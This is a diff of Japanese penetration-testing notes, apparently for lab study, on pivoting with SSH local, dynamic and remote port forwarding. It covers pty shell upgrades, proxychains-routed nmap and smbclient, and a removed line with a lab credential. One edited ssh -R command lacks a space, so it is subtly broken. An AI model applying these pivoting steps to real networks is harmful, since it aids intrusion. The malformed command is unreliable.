@@ -126,7 +126,7 @@ $$SSHリモートダイナミックポートフォワーディングのイメー
 > - Local Port Forwardingはインバウンドトラフィックが許可されていないと使えないので失敗することが多い(SSHクライアントで任意のリッスンポートを開いても、攻撃者のマシンからのリッスンポートへの通信がFWで遮断される)
 > - →[SSH Remote Port Forwarding](#SSH%20Remote%20Port%20Forwarding)のほうが成功確率高い
 
-1. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
+1. 非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
@@ -138,8 +138,6 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 ssh -N -L 0.0.0.0:<SSH_client_listen_port>:<target_IP>:<port> <SSH_server_username>@<SSH_server_IP>
 ```
 - `-N`：ポートフォワーディングのために使用することを明示し、新たなシェルが開かないようにする
-![](../../../画像ファイル/Pasted%20image%2020250923145526.png)
-$$SSHローカルポートフォワーディングイメージ図$$
 
 3. 別のセッションでSSHクライアントにアクセスし、SSHローカルポートフォワーディングに成功しているかどうかを確認
 ```zsh
@@ -153,30 +151,27 @@ tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*     
 …
 ```
 
-4. 攻撃者のマシンからSSHクライアントのリッスンポートに接続することで、目的マシンのDestPortにアクセス可能
+4. 攻撃者のマシンからSSHクライアントのリッスンポートに接続することで、TargetマシンのPortにアクセス可能
 
 ---
 
 # SSH Local Dynamic Port Forwarding
 
-- [Port Redirection & SSH Port Forwarding](#SSH%20Local%20Port%20Forwarding)と同じく、現実では失敗する可能性が高い
-	- →[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)
+- [SSH Local Port Forwarding](#SSH%20Local%20Port%20Forwarding)と同じく、現実では失敗する可能性が高い
+	- →[SSH Remote Dynamic Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)
 
-1. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
-	- RDP接続など、インタラクティブなシェルにアクセスできているなら不要
+1. 非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-2. SSHクライアント上でローカルダイナミックポートフォワーディング
-	- 出力はなし
+2. SSHクライアント上でローカルダイナミックポートフォワーディング（出力はなし）
 ```zsh
 # 例：ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
-ssh -N -D 0.0.0.0:[SSH client LISTEN Port(1025以上任意)] [SSH server username]@[SSH server IP]
+ssh -N -D 0.0.0.0:<SSH_client_listen_port> <SSH_server_username>@<SSH_server_IP>
 ```
 
 3. 攻撃者のマシン上で、Proxychainsの設定を変更する
-	- ⚠️Proxychainsは関数をフックする仕組みを使うので、静的リンクされたバイナリには使えない
 ```zsh
 sudo nano /etc/proxychains4.conf
 ```
@@ -190,15 +185,19 @@ socks5 [SSH client IP] [SSH client LISTEN Port(1025以上任意)]
 ```
 - ProxyListはstrict_chainモード(デフォルト)では１つにしておく必要がある
 
+>[!WARNING]
+>Proxychainsは関数をフックする仕組みを使うので、静的リンクされたバイナリには使えない。
+
 4. 攻撃者のマシンから、コマンドの先頭に`proxychains`をつけて実行することで、任意のポートにフォワーディングできる（SSHクライアントのIP/ポートは指定不要）
 ```zsh
 # 例：Nmapの場合（sTでないとProxyChains経由で動作しない）
-sudo proxychains nmap -vvv -sT --top-ports=20 -Pn [target_IP]
+sudo proxychains nmap -vvv -sT --top-ports=20 -Pn <target_IP>
 # 例：smbclientの場合
-sudo proxychains smbclient -L //[target_IP]/ -U hr_admin --password=Welcome1234
+sudo proxychains smbclient -L //<target_IP>/ -U <username> --password=<password>
 ```
 
-💡`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする
+>[!TIP]
+>`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする。
 ```zsh
 # Some timeouts in milliseconds
 tcp_read_time_out 15000
@@ -219,16 +218,14 @@ tcp_connect_time_out 800
 sudo systemctl start ssh
 ```
 
-2. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
-	- RDP接続など、インタラクティブなシェルにアクセスできているなら不要
+2. 非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-3. SSHクライアント上でリモートポートフォワーディング
-	- 出力はなし
+3. SSHクライアント上でリモートポートフォワーディング（出力はなし）
 ```zsh
-ssh -N -R 127.0.0.1:[SSH server LISTEN Port(1025以上任意)]:[target_IP]:[DestPort] [SSH server username(攻撃者)]@[SSH server IP]
+ssh -N -R 127.0.0.1:<SSH_server_listen_port>:<target_IP>:<Port><SSH_server_username(Attacker)>@<SSH_server_IP>
 ```
 
 4. 攻撃者のマシンでリモートポートフォワーディングが成功しているかどうかを確認
